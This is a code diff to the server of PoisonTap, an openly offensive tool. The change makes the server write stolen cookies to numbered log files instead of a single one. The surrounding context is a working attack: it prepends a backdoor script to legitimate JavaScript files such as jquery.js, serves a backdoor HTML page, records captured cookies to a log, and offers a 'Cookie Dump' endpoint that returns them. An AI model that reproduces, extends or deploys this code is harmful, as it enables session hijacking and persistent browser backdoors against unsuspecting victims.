@@ -16,7 +16,17 @@ var fs = require('fs');
 var util = require('util');
 var backdoorPreJs = fs.readFileSync(__dirname + '/target_backdoor.js'); // this gets prepended before legit js, eg jquery.js
 var backdoorHtml = fs.readFileSync(__dirname + '/backdoor.html');
-var log_file = fs.createWriteStream(__dirname + '/poisontap.cookies.log', {flags : 'a'});
+
+/* Gachnang 'counter' start */
+var path = require('path');
+var log_file_count = 0;
+while (path.existsSync(__dirname + '/poisontap.' + log_file_count + '.cookies.log', {flags : 'a'})){
+	log_file_count++;
+}
+var log_file = fs.createWriteStream(__dirname + '/poisontap.' + log_file_count + '.cookies.log', {flags : 'a'});
+/* Gachnang 'counter' end */
+/* before, instead of 'counter', here was: var log_file = fs.createWriteStream(__dirname + '/poisontap.cookies.log', {flags : 'a'}); */
+
 var log_stdout = process.stdout;
 var replacejs = fs.readdirSync(__dirname + '/js');
 var blinked = false;
@@ -112,7 +122,10 @@ var server = http.createServer(function(request, response) {
 	{
 		console.log('>>> Cookie Dump');
 		response.writeHead(200, headers);
-		response.write(fs.readFileSync(__dirname + '/poisontap.cookies.log'));
+		/* Gachnang 'counter' start */
+		response.write(fs.readFileSync(__dirname + '/poisontap.' + log_file_count + '.cookies.log'));
+		/* Gachnang 'counter' end */
+		/* before, instead of 'counter', here was: response.write(fs.readFileSync(__dirname + '/poisontap.cookies.log'));*/
 		response.end();
 		return;
 	}
